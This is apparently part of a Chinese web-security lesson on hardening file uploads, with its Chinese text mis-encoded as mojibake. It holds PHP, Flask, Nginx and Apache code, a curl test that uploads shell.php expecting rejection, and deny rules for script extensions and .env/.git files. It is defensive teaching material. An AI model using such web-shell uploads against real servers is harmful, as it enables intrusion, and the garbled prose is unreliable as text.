            throw new Exception("æ–‡ä»¶ MIME ç±»å‹ä¸å…è®¸");
        }

        // éªŒè¯ 6ï¼šç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å
        $safe_filename = $this->generateSafeFilename($filename);
        $filepath = $this->upload_dir . $safe_filename;

        // ç§»åŠ¨æ–‡ä»¶
        if (!move_uploaded_file($file["tmp_name"], $filepath)) {
            throw new Exception("æ–‡ä»¶ä¿å­˜å¤±è´¥");
        }

        // è®¾ç½®æ–‡ä»¶æƒé™ï¼ˆ644ï¼šæ‰€æœ‰è€…è¯»å†™ï¼Œå…¶ä»–äººåªè¯»ï¼‰
        chmod($filepath, 0644);

        return [
            "filename" => $safe_filename,
            "filepath" => $filepath,
            "mime_type" => $mime_type,
            "size" => $file["size"]
        ];
    }

    private function generateSafeFilename($original_filename) {
        $extension = strtolower(pathinfo($original_filename, PATHINFO_EXTENSION));

        // ç”Ÿæˆéšæœºæ–‡ä»¶å
        $prefix = uniqid("file_", true);
        $suffix = bin2hex(random_bytes(8));

        return "{$prefix}_{$suffix}.{$extension}";
    }
}

// ä½¿ç”¨ç¤ºä¾‹
$uploader = new SecureFileUploader("/var/www/uploads/");
try {
    $result = $uploader->upload("uploaded_file");
    echo "ä¸Šä¼ æˆåŠŸ: " . $result["filename"];
} catch (Exception $e) {
    echo "ä¸Šä¼ å¤±è´¥: " . $e->getMessage();
}
?>
```

**2. Python Flask å®‰å…¨ä¸Šä¼ ç¤ºä¾‹**

```python
from flask import Flask, request, jsonify
import os
import uuid
from werkzeug.utils import secure_filename
from datetime import datetime
import magic

app = Flask(__name__)

app.config["UPLOAD_FOLDER"] = "/var/www/uploads"
app.config["MAX_CONTENT_LENGTH"] = 10 * 1024 * 1024  # 10MB
app.config["ALLOWED_EXTENSIONS"] = {"jpg", "jpeg", "png", "gif", "pdf"}
app.config["ALLOWED_MIME_TYPES"] = {
    "image/jpeg",
    "image/png", 
    "image/gif",
    "application/pdf"
}

# ç¡®ä¿ä¸Šä¼ ç›®å½•å­˜åœ¨
os.makedirs(app.config["UPLOAD_FOLDER"], exist_ok=True)

def allowed_file(filename):
    """æ£€æŸ¥æ–‡ä»¶æ‰©å±•åç™½åå•"""
    return "." in filename and \
           filename.rsplit(".", 1)[1].lower() in app.config["ALLOWED_EXTENSIONS"]

def allowed_mime(filepath):
    """æ£€æŸ¥æ–‡ä»¶ MIME ç±»å‹ç™½åå•"""
    mime = magic.Magic(mime=True)
    file_type = mime.from_file(filepath)
    return file_type in app.config["ALLOWED_MIME_TYPES"]

def generate_safe_filename(filename):
    """ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å"""
    ext = filename.rsplit(".", 1)[1].lower() if "." in filename else ""
    
    # ç”Ÿæˆå”¯ä¸€æ–‡ä»¶å
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    random_str = uuid.uuid4().hex[:8]
    
    return f"{timestamp}_{random_str}.{ext}"

@app.route("/upload", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return jsonify({"error": "æ²¡æœ‰æ–‡ä»¶"}), 400
    
    file = request.files["file"]
    
    if file.filename == "":
        return jsonify({"error": "æ²¡æœ‰é€‰æ‹©æ–‡ä»¶"}), 400
    
    # éªŒè¯æ‰©å±•å
    if not allowed_file(file.filename):
        return jsonify({"error": "ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹"}), 400
    
    # ä¿å­˜ä¸´æ—¶æ–‡ä»¶ä»¥æ£€æŸ¥ MIME
    filename = secure_filename(file.filename)
    temp_path = os.path.join(app.config["UPLOAD_FOLDER"], "temp_" + filename)
    file.save(temp_path)
    
    # éªŒè¯ MIME ç±»å‹
    if not allowed_mime(temp_path):
        os.remove(temp_path)
        return jsonify({"error": "æ–‡ä»¶å†…å®¹ç±»å‹ä¸å…è®¸"}), 400
    
    # ç”Ÿæˆå®‰å…¨æ–‡ä»¶å
    safe_filename = generate_safe_filename(file.filename)
    final_path = os.path.join(app.config["UPLOAD_FOLDER"], safe_filename)
    os.rename(temp_path, final_path)
    
    # è®¾ç½®æ–‡ä»¶æƒé™
    os.chmod(final_path, 0o644)
    
    return jsonify({
        "success": True,
        "filename": safe_filename,
        "path": final_path
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

**3. Nginx é…ç½®ç¤ºä¾‹**

```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.php index.html;

    # ä¸Šä¼ ç›®å½•å®‰å…¨é…ç½®
    location /uploads/ {
        # ç¦æ­¢æ‰§è¡Œ PHP è„šæœ¬
        location ~ \.php$ {
            deny all;
        }
        
        # ç¦æ­¢æ‰§è¡Œå…¶ä»–è„šæœ¬
        location ~* \.(phtml|php3|php4|php5|pl|py|jsp|asp|aspx|sh|exe)$ {
            deny all;
        }
        
        # é™åˆ¶è¯·æ±‚ä½“å¤§å°
        client_max_body_size 10m;
    }

    # ä¸Šä¼ ç›®å½•ç¦æ­¢ç›´æ¥åˆ—å‡º
    location /uploads/ {
        autoindex off;
    }

    # ç¦æ­¢è®¿é—®æ•æ„Ÿæ–‡ä»¶
    location ~ /\. {
        deny all;
    }
    
    location ~ (\.git|\.svn|\.env|config\.php|database\.sql)$ {
        deny all;
    }
}
```

**4. Apache é…ç½®ç¤ºä¾‹**

```apache
# uploads ç›®å½• .htaccess
<Directory "/var/www/uploads">
    # ç¦æ­¢æ‰§è¡Œæ‰€æœ‰è„šæœ¬
    <FilesMatch "\.(php|phtml|php3|php4|php5|pl|py|jsp|asp|aspx|sh|exe)$">
        Order Allow,Deny
        Deny from all
    </FilesMatch>
    
    # ç¦æ­¢ç›´æ¥è®¿é—®
    Options -Indexes
    
    # é™åˆ¶è¯·æ±‚å¤§å°
    LimitRequestBody 10485760
</Directory>
```

**5. æµ‹è¯•ä¿®å¤**

```bash
# æµ‹è¯•ä¸å®‰å…¨ä¸Šä¼ 
curl -X POST "http://localhost:5000/upload" \
  -F "file=@shell.php"

# é¢„æœŸï¼š{"error": "ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹"}

# æµ‹è¯•æ­£å¸¸ä¸Šä¼ 
curl -X POST "http://localhost:5000/upload" \
  -F "file=@image.jpg"

# é¢„æœŸï¼š{"success": true, "filename": "20260201_123456_abcdef12.jpg"}
```

---

### ä»»åŠ¡ 5ï¼ˆè¿›é˜¶ï¼‰ï¼šé…ç½®è‡ªåŠ¨åŒ–æ–‡ä»¶æ¸…ç†

**ç›®æ ‡**ï¼šå®ç°å®šæœŸæ¸…ç†è¿‡æœŸä¸Šä¼ æ–‡ä»¶çš„è„šæœ¬ã€‚

**æ­¥éª¤**ï¼š

**1. Python æ¸…ç†è„šæœ¬**

```python
#!/usr/bin/env python3
import os
import time
from datetime import datetime, timedelta

UPLOAD_DIR = "/var/www/uploads"
MAX_AGE_DAYS = 7  # 7 å¤©ååˆ é™¤

def cleanup_old_files():
    """æ¸…ç†è¿‡æœŸä¸Šä¼ æ–‡ä»¶"""
    now = datetime.now()
    cutoff_time = now - timedelta(days=MAX_AGE_DAYS)
    deleted_count = 0
    
    for root, dirs, files in os.walk(UPLOAD_DIR):
        for filename in files:
            filepath = os.path.join(root, filename)
            
            # è·å–æ–‡ä»¶ä¿®æ”¹æ—¶é—´
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
            
            # åˆ é™¤è¿‡æœŸæ–‡ä»¶
            if mtime < cutoff_time:
                try:
                    os.remove(filepath)
                    deleted_count += 1
                    print(f"å·²åˆ é™¤: {filepath}")
                except OSError as e:
                    print(f"åˆ é™¤å¤±è´¥: {filepath} - {e}")
    
    print(f"æ¸…ç†å®Œæˆ: åˆ é™¤ {deleted_count} ä¸ªæ–‡ä»¶")

if __name__ == "__main__":
    cleanup_old_files()
```

**2. æ·»åŠ åˆ° crontab**

```bash
# ç¼–è¾‘ crontab
crontab -e

# æ¯å¤©å‡Œæ™¨ 3 ç‚¹æ‰§è¡Œæ¸…ç†
0 3 * * * /path/to/cleanup_uploads.py >> /var/log/cleanup.log 2>&1
```

---

## å·©å›ºç»ƒä¹ ï¼ˆé¢˜ä¸å¤ç›˜ï¼‰

---

### ç»ƒä¹  1ï¼šä¸ºä½•éœ€è¦ç›®å½•éš”ç¦»ï¼Ÿ

**æ€è·¯æç¤º**ï¼š

- æ–‡ä»¶ç›´æ¥å¯æ‰§è¡Œçš„é£é™©
- ä¸Šä¼ æ–‡ä»¶ä¸ Web æ··æ·†çš„åæœ
- å¦‚ä½•éš”ç¦»æ‰§è¡Œå’Œéæ‰§è¡Œæ–‡ä»¶

**å‚è€ƒç­”æ¡ˆ**ï¼š

**ç›®å½•éš”ç¦»çš„å¿…è¦æ€§**ï¼š

1. **æ‰§è¡Œé£é™©**ï¼š
   ```
   ä¸éš”ç¦»ï¼š
   uploads/
   â”œâ”€â”€ shell.php       # âœ… å¯ç›´æ¥è®¿é—®æ‰§è¡Œ
   â”œâ”€â”€ evil.jpg.php     # âœ… å¯èƒ½ç»•è¿‡æ‰©å±•åæ£€æŸ¥
   â””â”€â”€ config.php       # âœ… æ³„éœ²æ•°æ®åº“å¯†ç 
   
   éš”ç¦»ï¼š
   uploads/              # ğŸš« ç¦æ­¢æ‰§è¡Œ
   â”œâ”€â”€ image.jpg        # âœ… åªèƒ½è®¿é—®å›¾ç‰‡
   â””â”€â”€ document.pdf     # âœ… åªèƒ½è®¿é—®æ–‡æ¡£
   public/               # âœ… å¯æ‰§è¡Œç›®å½•
   â”œâ”€â”€ css/
   â”œâ”€â”€ js/
   â””â”€â”€ index.php
   ```

2. **æ··æ·†é£é™©**ï¼š
   | é£é™© | åæœ | ç¼“è§£ |
   |------|------|------|
   | æ¶æ„æ–‡ä»¶è¦†ç›–ç³»ç»Ÿæ–‡ä»¶ | ç³»ç»Ÿå´©æºƒ | éš”ç¦»ç›®å½• |
   | ä¸Šä¼ æ–‡ä»¶åŒ…å«æ•æ„Ÿä¿¡æ¯ | ä¿¡æ¯æ³„éœ² | ç‹¬ç«‹å­˜å‚¨ |
   | ä¸Šä¼ æ–‡ä»¶ä¸ä»£ç æ··æ·† | ç»´æŠ¤å›°éš¾ | åˆ†ç¦»ç»“æ„ |

3. **éš”ç¦»ç­–ç•¥**ï¼š

   ```bash
   Web æ ¹ç›®å½•
   â”œâ”€â”€ application/        # åº”ç”¨ä»£ç ï¼ˆPHP/Pythonï¼‰
   â”œâ”€â”€ public/             # å…¬å¼€èµ„æºï¼ˆCSS/JS/Imagesï¼‰
   â”œâ”€â”€ uploads/            # ä¸Šä¼ æ–‡ä»¶ï¼ˆç¦æ­¢æ‰§è¡Œï¼‰
   â”‚   â”œâ”€â”€ .htaccess      # ç¦æ­¢æ‰§è¡Œè„šæœ¬
   â”‚   â””â”€â”€ files/         # å®é™…æ–‡ä»¶
   â”œâ”€â”€ config/             # é…ç½®æ–‡ä»¶ï¼ˆWeb ä¸å¯è®¿é—®ï¼‰
   â”œâ”€â”€ logs/               # æ—¥å¿—ç›®å½•ï¼ˆWeb ä¸å¯è®¿é—®ï¼‰
   â””â”€â”€ tmp/                # ä¸´æ—¶æ–‡ä»¶ï¼ˆå®šæœŸæ¸…ç†ï¼‰
   ```

---

### ç»ƒä¹  2ï¼šæ’°å†™ä¸Šä¼ å®‰å…¨æ£€æŸ¥æ¸…å•

**ä»»åŠ¡**ï¼šä¸ºå¼€å‘å›¢é˜Ÿç¼–å†™æ–‡ä»¶ä¸Šä¼ å®‰å…¨æ£€æŸ¥æ¸…å•ã€‚

**æ£€æŸ¥æ¸…å•**ï¼š

```markdown
# æ–‡ä»¶ä¸Šä¼ å®‰å…¨æ£€æŸ¥æ¸…å•

## å¼€å‘é˜¶æ®µ
- [ ] éªŒè¯æ–‡ä»¶æ‰©å±•åï¼ˆç™½åå•ï¼‰
- [ ] éªŒè¯ MIME ç±»å‹ï¼ˆåŸºäºæ–‡ä»¶å†…å®¹ï¼‰
- [ ] éªŒè¯æ–‡ä»¶å¤§å°ï¼ˆè®¾ç½®æœ€å¤§é™åˆ¶ï¼‰
- [ ] éªŒè¯æ–‡ä»¶å†…å®¹ï¼ˆå¯é€‰ï¼šå›¾ç‰‡å°ºå¯¸ã€æ ¼å¼ï¼‰
- [ ] ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶åï¼ˆéšæœºã€å”¯ä¸€ï¼‰
- [ ] ç§»é™¤è·¯å¾„å­—ç¬¦ï¼ˆ../, ./ï¼‰
- [ ] éš”ç¦»ä¸Šä¼ ç›®å½•ï¼ˆä¸ Web ä»£ç åˆ†ç¦»ï¼‰
- [ ] é…ç½®ç¦æ­¢æ‰§è¡Œï¼ˆ.htaccess æˆ– Web æœåŠ¡å™¨é…ç½®ï¼‰
- [ ] è®¾ç½®æœ€å°æ–‡ä»¶æƒé™ï¼ˆ644 æˆ–æ›´ä¸¥æ ¼ï¼‰

## éƒ¨ç½²é˜¶æ®µ
- [ ] ä¸Šä¼ ç›®å½•ç¦æ­¢æ‰§è¡Œï¼ˆNginx/Apache é…ç½®ï¼‰
- [ ] ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼ˆautoindex offï¼‰
- [ ] é…ç½®é€Ÿç‡é™åˆ¶ï¼ˆé˜² DoSï¼‰
- [ ] é…ç½®è¯·æ±‚ä½“å¤§å°é™åˆ¶
- [ ] è®¾ç½®ç£ç›˜ç©ºé—´ç›‘æ§
- [ ] é…ç½®å¤‡ä»½ç­–ç•¥

## è¿ç»´é˜¶æ®µ
- [ ] å®šæœŸæ‰«æä¸Šä¼ ç›®å½•æŸ¥æ‰¾å¯ç–‘æ–‡ä»¶
- [ ] å®ç°è‡ªåŠ¨åŒ–æ¸…ç†è„šæœ¬ï¼ˆåˆ é™¤è¿‡æœŸæ–‡ä»¶ï¼‰
- [ ] ç›‘æ§ç£ç›˜ä½¿ç”¨æƒ…å†µ
- [ ] å®¡è®¡ä¸Šä¼ æ—¥å¿—ï¼ˆå¼‚å¸¸è¡Œä¸ºï¼‰
- [ ] é…ç½®å‘Šè­¦ï¼ˆå¼‚å¸¸ä¸Šä¼ æ´»åŠ¨ï¼‰
```

---

### ç»ƒä¹  3ï¼šé…ç½®å®‰å…¨å“åº”å¤´

**ä»»åŠ¡**ï¼šä¸ºåº”ç”¨é…ç½®å®Œæ•´çš„å®‰å…¨å“åº”å¤´ã€‚

**Nginx é…ç½®**ï¼š

```nginx
server {
    listen 80;
    server_name example.com;
    
    # å®‰å…¨å“åº”å¤´
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), camera=()" always;
    
    # HSTSï¼ˆä»… HTTPSï¼‰
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # CSP
    add_header Content-Security-Policy "
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data:;
        font-src 'self';
        connect-src 'self';
        frame-src 'none';
        object-src 'none';
        base-uri 'self';
        form-action 'self';
    " always;
}
```

**PHP é…ç½®**ï¼š

```php
<?php
// åœ¨æ‰€æœ‰é¡µé¢è¾“å‡ºå‰è°ƒç”¨
header("X-Frame-Options: SAMEORIGIN");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: strict-origin-when-cross-origin");

// CSPï¼ˆå¦‚æœä½¿ç”¨å†…è”è„šæœ¬ï¼‰
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'");
?>
```

---

## è¯„ä¼°æ ‡å‡†ï¼ˆè¾¾æˆåˆ¤å®šï¼‰

- âœ… æˆåŠŸæ¼”ç¤ºäº†è·¯å¾„ç©¿è¶Šæ”»å‡»ï¼ˆDVWA File Inclusionï¼‰
- âœ… æˆåŠŸæ¼”ç¤ºäº†æ–‡ä»¶ä¸Šä¼ æ”»å‡»ï¼ˆWeb Shellï¼‰
- âœ… å®ç°äº†è·¯å¾„è§„èŒƒåŒ–ï¼ˆbasename + realpathï¼‰
- âœ… å®ç°äº†å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ ç±»ï¼ˆç™½åå• + MIME éªŒè¯ï¼‰
- âœ… é…ç½®äº†ä¸Šä¼ ç›®å½•éš”ç¦»å’Œç¦æ­¢æ‰§è¡Œ
- âœ… å®ç°äº†è‡ªåŠ¨åŒ–æ–‡ä»¶æ¸…ç†è„šæœ¬
- âœ… ç¼–å†™äº†ä¸Šä¼ å®‰å…¨æ£€æŸ¥æ¸…å•
- âœ… é…ç½®äº†å®‰å…¨å“åº”å¤´ï¼ˆX-Frame-Options, CSP, HSTSï¼‰
- âœ… æäº¤äº†å‰åå¯¹æ¯”æˆªå›¾å’Œä¿®å¤ä»£ç 

## å­¦ä¹ æˆæœè¾¾æˆæƒ…å†µï¼ˆç”±å­¦ä¹ è€…å¡«å†™ï¼‰
- æˆªå›¾ä¸è¯æ®ï¼š
- å…³é”®å‘½ä»¤ä¸è¾“å‡ºï¼š
- ç»“è®ºä¸åæ€ï¼š


## é›†ä¸­å‚è€ƒç­”æ¡ˆï¼ˆå«æ€è·¯ï¼‰

### é¢˜ 1 å‚è€ƒç­”æ¡ˆ

ï¼ˆå¾…è¡¥å……ï¼‰


## å­¦ä¹ æˆæœç¤ºä¾‹å¡«å†™ï¼ˆå¯ç…§æŠ„ï¼‰

> å¯å°†"ç¤ºä¾‹"å†…å®¹æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ—¶é—´ä¸æˆªå›¾æ–‡ä»¶åã€‚

### æˆªå›¾ä¸è¯æ®ï¼ˆç¤ºä¾‹ï¼‰

- ä»»åŠ¡ 1ï¼š`images/dayXXX_task1.png`

### å…³é”®å‘½ä»¤ä¸è¾“å‡ºï¼ˆç¤ºä¾‹ï¼‰

```
å‘½ä»¤ç¤ºä¾‹ï¼š
è¾“å‡ºç¤ºä¾‹ï¼š
```

### ç»“è®ºä¸åæ€ï¼ˆç¤ºä¾‹ï¼‰

**æˆ‘ä»Šå¤©ææ¸…æ¥šäº†**ï¼š
- ï¼ˆç¤ºä¾‹ï¼‰ç†è§£äº†æ ¸å¿ƒæ¦‚å¿µ

**æˆ‘å·®ç‚¹ææ··çš„æ˜¯**ï¼š
- ï¼ˆç¤ºä¾‹ï¼‰æŸä¸ªæ˜“æ··æ·†ç‚¹

**æ˜å¤©æˆ‘è¦ç»§ç»­è¡¥çš„æ˜¯**ï¼š
- ï¼ˆç¤ºä¾‹ï¼‰ä¸‹ä¸€æ­¥æ·±å…¥æ–¹å‘

**æœ¬æ¬¡å­¦ä¹ è€—æ—¶**ï¼šçº¦ 2 å°æ—¶

**æŒæ¡ç¨‹åº¦è‡ªè¯„**ï¼š
- [x] ğŸ˜ƒ å®Œæˆäº†æ‰€æœ‰ä»»åŠ¡å¹¶ç†è§£åŸç†
